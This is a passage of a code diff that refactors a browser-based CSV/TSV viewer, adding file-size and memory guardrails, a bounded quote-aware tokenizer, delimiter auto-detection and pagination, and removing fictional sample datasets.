+      <span>Total Rows: <span id="metaTotalRows" class="metric-val">0</span></span>
+      <span>Filtered: <span id="metaFilteredRows" class="metric-val">0</span></span>
+      <span>Sort: <span id="metaSortState" class="metric-val">Original Order</span></span>
+    </div>
+  </div>
+
+  <!-- Data Table Container -->
+  <div class="table-container">
+    <table id="dataTable">
+      <thead id="tableHead"></thead>
+      <tbody id="tableBody">
+        <tr>
+          <td class="empty-state">Select a local file above or click "Load Security Test Dataset" to inspect data safely.</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- Pagination Footer -->
+  <div class="pagination-bar">
+    <div class="page-buttons">
+      <button type="button" id="firstPageBtn" disabled>&laquo; First</button>
+      <button type="button" id="prevPageBtn" disabled>&lsaquo; Prev</button>
+      <span id="pageButtonsContainer" class="page-buttons"></span>
+      <button type="button" id="nextPageBtn" disabled>Next &rsaquo;</button>
+      <button type="button" id="lastPageBtn" disabled>Last &raquo;</button>
+    </div>
+    <div class="control-row">
+      <span id="pageSummaryText" style="color: var(--text-muted); font-size: 13px;">Page 0 of 0</span>
+      <input type="number" id="jumpPageInput" min="1" placeholder="Page #" style="width: 76px;" disabled>
+      <button type="button" id="jumpPageBtn" disabled>Go</button>
+    </div>
+  </div>
+
   <script>
-    /*************************************************************************
-     * 1. EXPLICIT DELIMITER VARIABLE & APPLICATION STATE
-     *************************************************************************/
-    // Explicit state variable holding the user's delimiter of choice
-    let activeDelimiter = ',';
+    "use strict";
 
-    // Core data & UI state variables
-    let rawFileContent = '';
-    let currentFileName = 'enterprise_revenue_sample.csv';
-    let currentFileBytes = 0;
+    // =========================================================================
+    // 1. SECURITY & MEMORY GUARDRAIL CONSTANTS
+    // =========================================================================
+    const WARN_FILE_BYTES   = 10 * 1024 * 1024; // 10 MB: Pause & prompt user before reading
+    const STOP_FILE_BYTES   = 50 * 1024 * 1024; // 50 MB: HARD STOP full load to prevent V8 OOM crash
+    const SAFE_SLICE_BYTES  = 5 * 1024 * 1024;  // 5 MB: Safe disk slice size for previewing huge files
+    const MAX_ROW_COUNT     = 200000;           // Hard row ceiling in memory
+    const MAX_COL_COUNT     = 500;              // Hard column ceiling per row
+    const MAX_CELL_CHARS    = 32768;            // 32 KB cap per individual cell
+    const MAX_SEARCH_CHARS  = 256;              // Cap search string length
 
-    let headers = [];
-    let allRows = [];       // Array of row arrays (unfiltered)
-    let filteredRows = [];  // Array of row objects { originalIndex, cells }
+    // =========================================================================
+    // 2. APPLICATION STATE (INCLUDING EXPLICIT DELIMITER VARIABLE)
+    // =========================================================================
+    let activeDelimiter = ","; // Explicit variable holding user's chosen delimiter
+    let rawFileText     = "";
+    let headers         = [];
+    let allRows         = [];  // Each element: { __index: number, cells: string[] }
+    let viewRows        = [];  // Filtered and sorted subset of allRows
+    let currentPage     = 1;
+    let sortColIndex    = -1;
+    let sortDirection   = "none"; // "none" | "asc" | "desc"
+    let pendingFile     = null;
 
-    // Sorting state: column index (-1 = unsorted) & direction ('asc' | 'desc' | null)
-    let sortState = {
-      columnIndex: -1,
-      direction: null
-    };
+    // DOM References
+    const fileInput            = document.getElementById("fileInput");
+    const customDelimInput     = document.getElementById("customDelimInput");
+    const delimVarDisplay      = document.getElementById("delimVarDisplay");
+    const presetButtons        = document.querySelectorAll(".delim-preset");
+    const autoDetectBtn        = document.getElementById("autoDetectBtn");
+    const searchInput          = document.getElementById("searchInput");
+    const clearSearchBtn       = document.getElementById("clearSearchBtn");
+    const pageSizeSelect       = document.getElementById("pageSizeSelect");
+    const loadDemoBtn          = document.getElementById("loadDemoBtn");
+    const exportBtn            = document.getElementById("exportBtn");
+    const sanitizeExportToggle = document.getElementById("sanitizeExportToggle");
 
-    // Pagination & search state
-    let currentPage = 1;
-    let rowsPerPage = 10;
-    let searchQuery = '';
+    const guardrailBanner      = document.getElementById("guardrailBanner");
+    const bannerTitle          = document.getElementById("bannerTitle");
+    const bannerDesc           = document.getElementById("bannerDesc");
+    const bannerActions        = document.getElementById("bannerActions");
 
-    /*************************************************************************
-     * 2. BUILT-IN DEMONSTRATION DATASETS (WITH QUOTED DELIMITERS)
-     *************************************************************************/
-    const SAMPLE_DATASETS = {
-      csv: {
-        name: 'enterprise_revenue_sample.csv',
-        delimiter: ',',
-        content: [
-          'Transaction_ID,Account_Name,Region,Product_Tier,Contract_Value,Deal_Date,Owner,Status,Notes',
-          'TX-1041,"Acme Corp, Inc.",North America,Enterprise,"$148,500.00",2026-01-14,Elena Rostova,Active,"Multi-year renewal, includes priority SLA"',
-          'TX-1042,Globex Systems,EMEA,Professional,"$42,000.00",2026-01-19,Marcus Vance,Active,Standard annual license',
-          'TX-1043,"Soylent Nutrition, LLC",North America,Enterprise,"$215,900.00",2026-02-02,Elena Rostova,Active,"Custom delimiter engine, API add-on"',
-          'TX-1044,Initech Software,APAC,Starter,"$12,400.00",2026-02-11,Kenji Sato,Pending,Awaiting security review sign-off',
-          'TX-1045,"Umbrella Biotech, Ltd.",EMEA,Enterprise,"$390,000.00",2026-02-18,aria Lindqvist,Active,"Global deployment, 12,000 seats"',
-          'TX-1046,Massive Dynamic,North America,Enterprise,"$510,250.00",2026-02-27,Marcus Vance,Active,Executive sponsor approved Q1 expansion',
-          'TX-1047,"Hooli Cloud, Co.",North America,Professional,"$64,800.00",2026-03-04,Devon Brooks,Churned,"Migrated to internal tooling, Q1 exit"',
-          'TX-1048,Veidt Enterprises,EMEA,Enterprise,"$185,000.00",2026-03-09,Maria Lindqvist,Active,Includes dedicated compliance cluster',
-          'TX-1049,"Cyberdyne Autonomous, Inc.",APAC,Enterprise,"$740,000.00",2026-03-15,Kenji Sato,Active,"High-throughput telemetry, zero-latency tier"',
-          'TX-1050,Stark Resilient,North America,Professional,"$88,500.00",2026-03-21,Elena Rostova,Active,Upgraded from Starter plan',
-          'TX-1051,"Wayne Aerospace & Defense, Corp.",North America,Enterprise,"$620,000.00",2026-03-28,Marcus Vance,Active,"On-premise air-gapped license, 5yr term"',
-          'TX-1052,Aperture Science,North America,Starter,"$19,500.00",2026-04-02,Devon Brooks,Pending,Testing phase cohort B',
-          'TX-1053,"Tyrell Bionics, GmbH",EMEA,Enterprise,"$295,400.00",2026-04-08,Maria Lindqvist,Active,"EU Frankfurt shard, GDPR audit complete"',
-          'TX-1054,Nakatomi Trading,APAC,Professional,"$53,200.00",2026-04-12,Kenji Sato,Active,Tokyo branch consolidation',
-          'TX-1055,"Wonka Confections, Ltd.",EMEA,Starter,"$15,800.00",2026-04-18,Devon Brooks,Active,"Seasonal analytics package, Q2 promo"',
-          'TX-1056,Gringotts Financial,EMEA,Enterprise,"$450,000.00",2026-04-22,Maria Lindqvist,Active,"High-security ledger sync, encrypted vault"',
-          'TX-1057,"Oscorp Industries, Inc.",North America,Professional,"$76,300.00",2026-05-01,Elena Rostova,Pending,Legal redlining indemnity clause',
-          'TX-1058,Blue Sun Corporation,APAC,Enterprise,"$310,000.00",2026-05-06,Kenji Sato,Active,Regional logistics hub rollout'
-        ].join('\n')
-      },
-      pipe: {
-        name: 'server_audit_stream.txt',
-        delimiter: '|',
-        content: [
-          'Event_ID|Timestamp_UTC|Service_Node|Severity|Latency_ms|Status_Code|Payload_Summary',
-          'EVT-9001|2026-10-26 08:12:04|auth-gateway-01|INFO|14.2|200|"OAuth2 token issued | user=admin@corp.io"',
-          'EVT-9002|2026-10-26 08:12:19|billing-worker-04|WARN|482.7|429|"Rate threshold approached | retry_after=30s"',
-          'EVT-9003|2026-10-26 08:13:01|db-replica-eu-02|ERROR|1240.5|504|"Connection pool exhausted | active_threads=256"',
-          'EVT-9004|2026-10-26 08:13:44|search-indexer-01|INFO|28.9|200|Index shard 04 compacted successfully',
-          'EVT-9005|2026-10-26 08:14:10|auth-gateway-02|INFO|11.8|200|Session validated via hardware key',
-          'EVT-9006|2026-10-26 08:15:02|cdn-edge-apac-09|WARN|310.0|502|"Upstream timeout | fallback cache served"',
-          'EVT-9007|2026-10-26 08:15:39|payment-webhook-01|INFO|64.1|201|Stripe invoice settled: INV-88412',
-          'EVT-9008|2026-10-26 08:16:05|ml-inference-gpu-03|INFO|95.4|200|Batch embedding vectorization complete'
-        ].join('\n')
-      },
-      tab: {
-        name: 'genomic_assay_metrics.tsv',
-        delimiter: '\t',
-        content: [
-          'Sample_Code\tGene_Target\tChromosome\tRead_Depth\tQuality_Score\tClassification\tLab_Comment',
-          'SMP-401\tBRCA1\tchr17\t1420\t99.4%\tPathogenic\t"Confirmed via Sanger\trepeat assay"',
-          'SMP-402\tTP53\tchr17\t980\t98.9%\tBenign\tNormal coverage distribution',
-          'SMP-403\tEGFR\tchr7\t2150\t99.8%\tActionable\tExon 19 deletion detected',
-          'SMP-404\tKRAS\tchr12\t1105\t97.2%\tVUS\tVariant of uncertain significance',
-          'SMP-405\tALK\tchr2\t1890\t99.6%\tActionable\tFusion transcript positive',
-          'SMP-406\tBRAF\tchr7\t1640\t99.1%\tPathogenic\tV600E mutation confirmed'
-        ].join('\n')
+    const metaFileName         = document.getElementById("metaFileName");
+    const metaFileSize         = document.getElementById("metaFileSize");
+    const metaDelimiter        = document.getElementById("metaDelimiter");
+    const metaTotalRows        = document.getElementById("metaTotalRows");
+    const metaFilteredRows     = document.getElementById("metaFilteredRows");
+    const metaSortState        = document.getElementById("metaSortState");
+
+    const tableHead            = document.getElementById("tableHead");
+    const tableBody            = document.getElementById("tableBody");
+    const firstPageBtn         = document.getElementById("firstPageBtn");
+    const prevPageBtn          = document.getElementById("prevPageBtn");
+    const nextPageBtn          = document.getElementById("nextPageBtn");
+    const lastPageBtn          = document.getElementById("lastPageBtn");
+    const pageButtonsContainer = document.getElementById("pageButtonsContainer");
+    const pageSummaryText      = document.getElementById("pageSummaryText");
+    const jumpPageInput        = document.getElementById("jumpPageInput");
+    const jumpPageBtn          = document.getElementById("jumpPageBtn");
+
+    // =========================================================================
+    // 3. DELIMITER VARIABLE MANAGEMENT (ZERO-LENGTH LOOP PROTECTION)
+    // =========================================================================
+    function setSafeDelimiter(rawInput) {
+      if (typeof rawInput !== "string" || rawInput.length === 0) {
+        activeDelimiter = ","; // Never allow 0-length string to prevent tokenizer infinite loop
+      } else {
+        const unescaped = rawInput === "\\t" ? "\t" : rawInput;
+        activeDelimiter = unescaped.slice(0, 10);
       }
-    };
 
-    /*************************************************************************
-     * 3. QUOTE-AWARE DELIMITED TOKENIZER (SUPPORTS CUSTOM DELIMITERS)
-     *************************************************************************/
-    /**
-     * Parses raw delimited text into a 2D array of rows and columns.
-     * Respects RFC 4180 double-quoted fields so delimiters and newlines inside
-     * quotes do not split columns prematurely, and handles escaped quotes ("").
-     *
-     * @param {string} text - Raw file content
-     * @param {string} delimiter - Active delimiter string (e.g., ',', '\t', '|', '::')
-     * @returns {string[][]} Parsed 2D array of rows
-     */
-    function parseDelimitedData(text, delimiter) {
-      if (!text || !text.trim()) return [];
-      const effectiveDelimiter = delimiter || ',';
-      const delimLen = effectiveDelimiter.length;
+      const displayStr = activeDelimiter === "\t" ? "\\t" : activeDelimiter;
+      customDelimInput.value = displayStr;
+      delimVarDisplay.textContent = `activeDelimiter = "${displayStr}"`;
+      metaDelimiter.textContent = `"${displayStr}"`;
+
+      presetButtons.forEach(btn => {
+        const btnDelim = btn.getAttribute("data-delim");
+        btn.classList.toggle("active-preset", btnDelim === activeDelimiter);
+      });
+
+      return activeDelimiter;
+    }
+
+    presetButtons.forEach(btn => {
+      btn.addEventListener("click", () => {
+        setSafeDelimiter(btn.getAttribute("data-delim"));
+        if (rawFileText) {
+          currentPage = 1;
+          parseAndProcessText();
+        }
+      });
+    });
+
+    customDelimInput.addEventListener("input", () => {
+      if (customDelimInput.value.length === 0) return; // Wait until user types or blurs
+      setSafeDelimiter(customDelimInput.value);
+      if (rawFileText) {
+        currentPage = 1;
+        parseAndProcessText();
+      }
+    });
+
+    customDelimInput.addEventListener("blur", () => {
+      if (customDelimInput.value.length === 0) {
+        setSafeDelimiter(",");
+        if (rawFileText) parseAndProcessText();
+      }
+    });
+
+    autoDetectBtn.addEventListener("click", () => {
+      if (!rawFileText) return;
+      const sample = rawFileText.slice(0, 8192);
+      const candidates = [",", "\t", ";", "|", ":"];
+      let bestDelim = ",";
+      let bestScore = -1;
+
+      const sampleLines = sample.split(/\r?\n/).filter(l => l.trim().length > 0).slice(0, 15);
+      if (sampleLines.length > 0) {
+        candidates.forEach(cand => {
+          const counts = sampleLines.map(line => line.split(cand).length - 1);
+          const firstCount = counts[0];
+          if (firstCount > 0) {
+            const consistent = counts.every(c => c === firstCount);
+            const score = consistent ? firstCount * 10 : firstCount;
+            if (score > bestScore) {
+              bestScore = score;
+              bestDelim = cand;
+            }
+          }
+        });
+      }
+      setSafeDelimiter(bestDelim);
+      currentPage = 1;
+      parseAndProcessText();
+    });
+
+    // =========================================================================
+    // 4. THREE-TIER FILE SIZE GUARDRAIL (DECISION ENGINE FOR BIG FILES)
+    // =========================================================================
+    function formatBytes(bytes) {
+      if (bytes < 1024) return bytes + " B";
+      if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + " KB";
+      return (bytes / (1024 * 1024)).toFixed(2) + " MB";
+    }
+
+    function hideBanner() {
+      guardrailBanner.className = "guardrail-banner";
+      bannerTitle.textContent = "";
+      bannerDesc.textContent = "";
+      bannerActions.textContent = "";
+    }
+
+    function showBanner(level, titleText, descText, actionButtons) {
+      guardrailBanner.className = `guardrail-banner ${level}`;
+      bannerTitle.textContent = titleText;
+      bannerDesc.textContent = descText;
+      bannerActions.textContent = "";
+      actionButtons.forEach(cfg => {
+        const btn = document.createElement("button");
+        btn.type = "button";
+        btn.textContent = cfg.label;
+        if (cfg.className) btn.className = cfg.className;
+        btn.addEventListener("click", cfg.onClick);
+        bannerActions.appendChild(btn);
+      });
+    }
+
+    fileInput.addEventListener("change", (e) => {
+      const file = e.target.files && e.target.files[0];
+      if (!file) return;
+      pendingFile = file;
+      hideBanner();
+
+      const size = file.size;
+      const estRam = formatBytes(size * 6);
+
+      // TIER 3: > 50 MB -> HARD STOP FULL FILE LOAD
+      if (size > STOP_FILE_BYTES) {
+        showBanner(
+          "danger",
+          `HARD STOP: File Size (${formatBytes(size)}) Exceeds 50 MB Memory Safety Limit`,
+          `Full in-memory parsing is blocked because allocating ${formatBytes(size)} into UTF-16 strings and array objects requires ~${estRam} of browser heap and risks an uncatchable tab crash. Choose whether to abort completely or inspect a safe 5 MB disk slice.`,
+          [
+            {
+              label: "Stop & Abort Process",
+              className: "btn-danger",
+              onClick: () => {
+                fileInput.value = "";
+                pendingFile = null;
+                hideBanner();
+              }
+            },
+            {
+              label: "Inspect Safe 5 MB Slice Only (File.slice)",
+              className: "btn-primary",
+              onClick: () => loadSafeFileSlice(file, SAFE_SLICE_BYTES)
+            }
+          ]
+        );
+        return;
+      }
+
+      // TIER 2: 10 MB to 50 MB -> PAUSE & WARN BEFORE PROCESSING
+      if (size > WARN_FILE_BYTES) {
+        showBanner(
+          "warn",
+          `LARGE FILE WARNING: ${file.name} (${formatBytes(size)})`,
+          `Processing this entire file in memory will consume approximately ${estRam} of RAM and may briefly pause the UI during sorting. How would you like to proceed?`,
+          [
+            {
+              label: "Stop & Cancel",
+              onClick: () => {
+                fileInput.value = "";
+                pendingFile = null;
+                hideBanner();
+              }
+            },
+            {
+              label: "Load Safe 5 MB Preview Slice",
+              className: "btn-primary",
+              onClick: () => loadSafeFileSlice(file, SAFE_SLICE_BYTES)
+            },
+            {
+              label: "Proceed with Full File Load",
+              onClick: () => loadFullFile(file)
+            }
+          ]
+        );
+        return;
+      }
+
+      // TIER 1: <= 10 MB -> SAFE IMMEDIATE PROCESSING
+      loadFullFile(file);
+    });
+
+    async function loadFullFile(file) {
+      try {
+        hideBanner();
+        metaFileName.textContent = file.name;
+        metaFileSize.textContent = formatBytes(file.size);
+        rawFileText = await file.text();
+        currentPage = 1;
+        sortColIndex = -1;
+        sortDirection = "none";
+        parseAndProcessText();
+      } catch (err) {
+        showBanner("danger", "File Read Error", String(err.message || err), []);
+      }
+    }
+
+    async function loadSafeFileSlice(file, sliceBytes) {
+      try {
+        const blobSlice = file.slice(0, sliceBytes);
+        let sliceText = await blobSlice.text();
+
+        // Trim incomplete trailing line so the last row isn't half-cut
+        const lastNewline = sliceText.lastIndexOf("\n");
+        if (lastNewline > 0) {
+          sliceText = sliceText.slice(0, lastNewline);
+        }
+
+        metaFileName.textContent = `${file.name} [5 MB Slice]`;
+        metaFileSize.textContent = `${formatBytes(sliceText.length)} of ${formatBytes(file.size)}`;
+        rawFileText = sliceText;
+        currentPage = 1;
+        sortColIndex = -1;
+        sortDirection = "none";
+        parseAndProcessText();
+
+        showBanner(
+          "warn",
+          "Partial File Slice Active (Memory Guardrail)",
+          `Showing rows parsed from the first ${formatBytes(sliceBytes)} of ${file.name}. Full file allocation was skipped to protect browser memory stability.`,
+          [{ label: "Dismiss Notice", onClick: hideBanner }]
+        );
+      } catch (err) {
+        showBanner("danger", "Slice Read Error", String(err.message || err), []);
+      }
+    }
+
+    // =========================================================================
+    // 5. BOUNDED QUOTE-AWARE TOKENIZER (NO INFINITE LOOPS OR CELL OVERFLOWS)
+    // =========================================================================
+    function parseDelimitedSafe(text, delimiter) {
+      const safeDelim = (typeof delimiter === "string" && delimiter.length > 0) ? delimiter : ",";
+      const delimLen = safeDelim.length; // Guaranteed >= 1
 
       const rows = [];
       let currentRow = [];
-      let currentCell = '';
+      let currentCell = "";
       let inQuotes = false;
       let i = 0;
       const len = text.length;
 
+      let truncatedByRowCap = false;
+      let truncatedByColCap = false;
+      let truncatedByCellCap = false;
+
       while (i < len) {
-        const char = text[i];
+        const ch = text[i];
 
         if (inQuotes) {
-          if (char === '"') {
-            // Check for escaped double quote ("")
+          if (ch === '"') {
             if (i + 1 < len && text[i + 1] === '"') {
-              currentCell += '"';
+              if (currentCell.length < MAX_CELL_CHARS) {
+                currentCell += '"';
+              } else {
+                truncatedByCellCap = true;
+              }
               i += 2;
               continue;
             } else {
@@ -458,672 +764,435 @@
               continue;
             }
           } else {
-            currentCell += char;
-            i++;
-            continue;
-          }
-        } else {
-          // Only enter quoted mode if quote appears at start of a cell (after optional whitespace)
-          if (char === '"' && currentCell.trim() === '') {
-            currentCell = '';
-            inQuotes = true;
-            i++;
-            continue;
-          }
-
-          // Check if current position matches the active delimiter
-          if (text.substr(i, delimLen) === effectiveDelimiter) {
-            currentRow.push(currentCell.trim());
-            currentCell = '';
-            i += delimLen;
-            continue;
-          }
-
-          // Handle row breaks (\r\n or \n or \r)
-          if (char === '\r' || char === '\n') {
-            currentRow.push(currentCell.trim());
-            // Push non-empty rows
-            if (currentRow.length > 1 || (currentRow.length === 1 && currentRow[0] !== '')) {
-              rows.push(currentRow);
-            }
-            currentRow = [];
-            currentCell = '';
-            if (char === '\r' && i + 1 < len && text[i + 1] === '\n') {
-              i += 2;
+            if (currentCell.length < MAX_CELL_CHARS) {
+              currentCell += ch;
             } else {
-              i++;
+              truncatedByCellCap = true;
             }
+            i++;
             continue;
           }
+        }
 
-          currentCell += char;
+        if (ch === '"' && currentCell.length === 0) {
+          inQuotes = true;
           i++;
+          continue;
         }
-      }
 
-      // Flush final cell/row
-      if (currentCell.length > 0 || currentRow.length > 0) {
-        currentRow.push(currentCell.trim());
-        if (currentRow.length > 1 || (currentRow.length === 1 && currentRow[0] !== '')) {
-          rows.push(currentRow);
-        }
-      }
-
-      return rows;
-    }
-
-    /**
-     * Auto-detects the most likely delimiter from the first 10 lines of raw text.
-     */
-    function detectBestDelimiter(text) {
-      const candidates = [',', '\t', ';', '|', ':'];
-      const sampleLines = text.trim().split(/\r?\n/).slice(0, 10).filter(Boolean);
-      if (sampleLines.length === 0) return ',';
-
-      let bestDelimiter = ',';
-      let bestScore = -1;
-
-      candidates.forEach(candidate => {
-        const counts = sampleLines.map(line => parseDelimitedData(line, candidate)[0]?.length || 1);
-        const firstCount = counts[0];
-        if (firstCount > 1) {
-          // Reward consistency across lines and higher column counts
-          const consistentLines = counts.filter(c => c === firstCount).length;
-          const score = (consistentLines / sampleLines.length) * 100 + firstCount;
-          if (score > bestScore) {
-            bestScore = score;
-            bestDelimiter = candidate;
+        if (text.startsWith(safeDelim, i)) {
+          if (currentRow.length < MAX_COL_COUNT) {
+            currentRow.push(currentCell);
+          } else {
+            truncatedByColCap = true;
           }
+          currentCell = "";
+          i += delimLen;
+          continue;
         }
-      });
 
-      return bestDelimiter;
-    }
+        if (ch === "\r" || ch === "\n") {
+          if (ch === "\r" && i + 1 < len && text[i + 1] === "\n") {
+            i++;
+          }
+          if (currentRow.length < MAX_COL_COUNT) {
+            currentRow.push(currentCell);
+          }
+          if (currentRow.length > 1 || (currentRow.length === 1 && currentRow[0] !== "")) {
+            rows.push(currentRow);
+          }
+          if (rows.length >= MAX_ROW_COUNT + 1) {
+            truncatedByRowCap = true;
+            break;
+          }
+          currentRow = [];
+          currentCell = "";
+          i++;
+          continue;
+        }
 
-    /*************************************************************************
-     * 4. DELIMITER UI SYNC & STATE CONTROLLER
-     *************************************************************************/
-    const customDelimiterInput = document.getElementById('customDelimiterInput');
-    const customDelimiterBadge = document.getElementById('customDelimiterBadge');
-    const jsVariablePreview = document.getElementById('jsVariablePreview');
-    const statActiveDelimiter = document.getElementById('statActiveDelimiter');
-    const presetButtons = document.querySelectorAll('.delimiter-preset-btn');
-
-    /**
-     * Formats a delimiter for human-readable display in badges and code previews
-     */
-    function formatDelimiterDisplay(delim) {
-      if (delim === '\t') return '\\t';
-      if (delim === ' ') return 'Space';
-      return delim;
-    }
-
-    /**
-     * Updates the explicit `activeDelimiter` variable, syncs preset buttons and
-     * custom input field, and re-runs tokenization on the active dataset.
-     */
-    function setActiveDelimiter(newDelimiter, source = 'preset') {
-      if (!newDelimiter || newDelimiter.length === 0) return;
-
-      // Interpret literal "\t" typed into custom box as an actual tab character
-      const resolvedDelimiter = (newDelimiter === '\\t') ? '\t' : newDelimiter;
-
-      // Update the explicit JavaScript variable
-      activeDelimiter = resolvedDelimiter;
-
-      // Sync custom input box unless the user is actively typing in it
-      if (source !== 'input') {
-        customDelimiterInput.value = formatDelimiterDisplay(activeDelimiter);
-      }
-
-      // Update code badge & telemetry indicators
-      const displayStr = formatDelimiterDisplay(activeDelimiter);
-      jsVariablePreview.textContent = `activeDelimiter = "${displayStr}"`;
-      statActiveDelimiter.textContent = `"${displayStr}"`;
-
-      if (activeDelimiter.length === 1) {
-        customDelimiterBadge.textContent = `ASCII ${activeDelimiter.charCodeAt(0)}`;
-      } else {
-        customDelimiterBadge.textContent = `${activeDelimiter.length} chars`;
-      }
-
-      // Highlight matching preset button if any
-      presetButtons.forEach(btn => {
-        const btnDelim = btn.getAttribute('data-delimiter');
-        const isActive = btnDelim === activeDelimiter;
-        if (isActive) {
-          btn.className = 'delimiter-preset-btn flex-1 min-w-[78px] text-xs font-semibold py-2 px-2.5 rounded-lg border transition flex flex-col items-center justify-center gap-0.5 bg-indigo-600 text-white border-indigo-600 shadow-sm shadow-indigo-500/20';
+        if (currentCell.length < MAX_CELL_CHARS) {
+          currentCell += ch;
         } else {
-          btn.className = 'delimiter-preset-btn flex-1 min-w-[78px] text-xs font-medium py-2 px-2.5 rounded-lg border transition flex flex-col items-center justify-center gap-0.5 bg-slate-50 dark:bg-slate-800/70 text-slate-700 dark:text-slate-300 border-slate-200 dark:border-slate-700 hover:bg-slate-100 dark:hover:bg-slate-800';
+          truncatedByCellCap = true;
         }
-      });
+        i++;
+      }
 
-      // Re-tokenize and render from raw file content
-      processRawData();
+      if (!truncatedByRowCap && (currentCell.length > 0 || currentRow.length > 0)) {
+        if (currentRow.length < MAX_COL_COUNT) {
+          currentRow.push(currentCell);
+        }
+        rows.push(currentRow);
+      }
+
+      return { rows, truncatedByRowCap, truncatedByColCap, truncatedByCellCap };
     }
 
-    /*************************************************************************
-     * 5. DATA PIPELINE: TOKENIZE -> FILTER -> SORT -> PAGINATE -> RENDER
-     *************************************************************************/
-    function processRawData() {
-      const parsed = parseDelimitedData(rawFileContent, activeDelimiter);
+    function parseAndProcessText() {
+      const result = parseDelimitedSafe(rawFileText, activeDelimiter);
+      const parsed = result.rows;
 
       if (parsed.length === 0) {
         headers = [];
         allRows = [];
-      } else {
-        headers = parsed[0];
-        // Normalize row lengths to match header count
-        allRows = parsed.slice(1).map((cells, idx) => ({
-          originalIndex: idx,
-          cells: headers.map((_, colIdx) => (cells[colIdx] !== undefined ? cells[colIdx] : ''))
-        }));
+        viewRows = [];
+        exportBtn.disabled = true;
+        renderAll();
+        return;
       }
 
-      // Reset sort if column index is out of bounds after delimiter change
-      if (sortState.columnIndex >= headers.length) {
-        sortState = { columnIndex: -1, direction: null };
-      }
+      headers = parsed[0].map((h, idx) => {
+        const clean = h.trim();
+        return clean.length > 0 ? clean : `Column_${idx + 1}`;
+      });
 
-      currentPage = 1;
-      applyFilterAndSort();
-    }
+      const bodySlice = parsed.slice(1);
+      allRows = bodySlice.map((cells, idx) => ({
+        __index: idx + 1,
+        cells: cells
+      }));
 
-    /**
-     * Smart comparator that handles formatted currency/numbers, dates, and strings
-     */
-    function compareValues(valA, valB, direction) {
-      const aStr = (valA ?? '').toString().trim();
-      const bStr = (valB ?? '').toString().trim();
+      exportBtn.disabled = allRows.length === 0;
 
-      // Always push empty cells to the bottom
-      if (aStr === '' && bStr === '') return 0;
-      if (aStr === '') return 1;
-      if (bStr === '') return -1;
-
-      const multiplier = direction === 'asc' ? 1 : -1;
-
-      // 1. Check numeric / currency / percentage values (e.g. "$148,500.00", "99.4%", "-42.5")
-      const cleanNumRegex = /^[$€£¥₹]?\s*-?\d{1,3}(?:,\d{3})*(?:\.\d+)?\s*%?$|^-?\d+(?:\.\d+)?\s*%?$/;
-      if (cleanNumRegex.test(aStr) && cleanNumRegex.test(bStr)) {
-        const numA = parseFloat(aStr.replace(/[$€£¥₹,%\s]/g, ''));
-        const numB = parseFloat(bStr.replace(/[$€£¥₹,%\s]/g, ''));
-        if (!isNaN(numA) && !isNaN(numB)) {
-          return (numA - numB) * multiplier;
-        }
-      }
-
-      // 2. Check ISO-like Date strings
-      const isDateLike = /^\d{4}-\d{2}-\d{2}/.test(aStr) && /^\d{4}-\d{2}-\d{2}/.test(bStr);
-      if (isDateLike) {
-        const timeA = Date.parse(aStr);
-        const timeB = Date.parse(bStr);
-        if (!isNaN(timeA) && !isNaN(timeB)) {
-          return (timeA - timeB) * multiplier;
-        }
-      }
-
-      // 3. Natural alphanumeric string comparison
-      return aStr.localeCompare(bStr, undefined, { numeric: true, sensitivity: 'base' }) * multiplier;
-    }
-
-    /**
-     * Filters `allRows` by `searchQuery` and applies `sortState`
-     */
-    function applyFilterAndSort() {
-      const q = searchQuery.trim().toLowerCase();
-
-      // Step 1: Global search filtering across all columns
-      if (!q) {
-        filteredRows = [...allRows];
-      } else {
-        filteredRows = allRows.filter(rowObj =>
-          rowObj.cells.some(cell => cell.toLowerCase().includes(q))
+      if (result.truncatedByRowCap || result.truncatedByColCap || result.truncatedByCellCap) {
+        const notices = [];
+        if (result.truncatedByRowCap) notices.push(`Row limit capped at ${MAX_ROW_COUNT.toLocaleString()} rows`);
+        if (result.truncatedByColCap) notices.push(`Column limit capped at ${MAX_COL_COUNT} columns`);
+        if (result.truncatedByCellCap) notices.push(`Oversize cells truncated at ${MAX_CELL_CHARS} chars`);
+        showBanner(
+          "warn",
+          "Structural Memory Guardrail Triggered",
+          notices.join(" | "),
+          [{ label: "Dismiss", onClick: hideBanner }]
         );
       }
 
-      // Step 2: Column sorting
-      const resetSortBtn = document.getElementById('resetSortBtn');
-      if (sortState.columnIndex >= 0 && sortState.direction) {
-        resetSortBtn.classList.remove('hidden');
-        const colIdx = sortState.columnIndex;
-        const dir = sortState.direction;
-        filteredRows.sort((a, b) => {
-          const cmp = compareValues(a.cells[colIdx], b.cells[colIdx], dir);
-          return cmp !== 0 ? cmp : a.originalIndex - b.originalIndex;
-        });
-      } else {
-        resetSortBtn.classList.add('hidden');
-        filteredRows.sort((a, b) => a.originalIndex - b.originalIndex);
-      }
-
-      renderDashboard();
-    }
-
-    /*************************************************************************
-     * 6. DOM RENDERING (HEADERS, HIGHLIGHTED CELLS, STATS, PAGINATION)
-     *************************************************************************/
-    function escapeHtml(str) {
-      return str
-        .replace(/&/g, '&amp;')
-        .replace(/</g, '&lt;')
-        .replace(/>/g, '&gt;')
-        .replace(/"/g, '&quot;')
-        .replace(/'/g, '&#039;');
-    }
-
-    function highlightMatch(text, query) {
-      const safeText = escapeHtml(text);
-      if (!query) return safeText;
-      const escapedQuery = query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-      const regex = new RegExp(`(${escapedQuery})`, 'gi');
-      return safeText.replace(
-        regex,
-        '<mark class="bg-amber-200/90 dark:bg-amber-500/40 text-slate-900 dark:text-amber-100 rounded px-0.5 font-medium">$1</mark>'
-      );
-    }
-
-    function renderDashboard() {
-      const tableHead = document.getElementById('tableHead');
-      const tableBody = document.getElementById('tableBody');
-      const emptyState = document.getElementById('emptyState');
-
-      // Update Summary Telemetry
-      document.getElementById('statTotalRows').textContent = allRows.length.toLocaleString();
-      document.getElementById('statFilteredRows').textContent = filteredRows.length.toLocaleString();
-      document.getElementById('statColumns').textContent = headers.length.toLocaleString();
-
-      // Update Search Match Badge
-      const searchMatchBadge = document.getElementById('searchMatchBadge');
-      const clearSearchBtn = document.getElementById('clearSearchBtn');
-      if (searchQuery.trim().length > 0) {
-        searchMatchBadge.textContent = `${filteredRows.length} match${filteredRows.length === 1 ? '' : 'es'}`;
-        searchMatchBadge.classList.remove('hidden');
-        clearSearchBtn.classList.remove('hidden');
-      } else {
-        searchMatchBadge.classList.add('hidden');
